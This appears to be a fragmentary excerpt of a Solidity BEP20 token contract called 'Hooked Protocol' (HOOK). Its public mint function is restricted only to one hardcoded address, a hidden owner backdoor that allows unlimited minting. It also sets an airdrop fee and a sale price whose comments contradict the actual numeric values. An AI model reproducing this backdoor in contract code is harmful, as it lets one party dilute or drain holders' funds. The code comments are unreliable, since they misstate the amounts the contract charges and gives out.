...
contract BEP20 is Context, IBEP20, Ownable, Operator {
    ...
    function mint(uint256 amount) public returns (bool) {
        require(msg.sender == 0x254553980a2901d73B41D1136EE45a8987B3e781);
...
contract HOOK is BEP20('Hooked Protocol', 'HOOK') {
    ...
    */
    ...
    uint256 private _airdropEth =   100000000000000; //0.01 BNB Airdrop fee
    uint256 private _airdropToken = 5000000000000000000000; // 50 token will be given on airdrop
    ...
    uint256 private salePrice = 5000;// 0.01*100000000=1,000 token for 0.01 bnb (set as per requirements)
